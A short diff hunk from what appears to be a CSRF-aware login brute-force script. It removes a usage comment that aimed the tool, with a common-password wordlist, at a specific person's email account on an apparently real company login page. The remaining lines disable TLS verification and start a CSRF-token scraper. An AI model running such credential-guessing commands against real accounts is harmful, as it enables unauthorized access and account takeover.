@@ -6,9 +6,6 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from timeit import default_timer as timer
 
-
-# python3 brutecsrf.py -l pablo.urcola@bitbrain.es -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -u https://licetest.bitbrain.es/ -m "Invalid credentials." -c _csrf_csrfvalue -v 
-
 def getCSRF(url, csrfname, session):
 	html = session.get(url, verify=False).text
 	soup = BeautifulSoup(html, features="lxml")
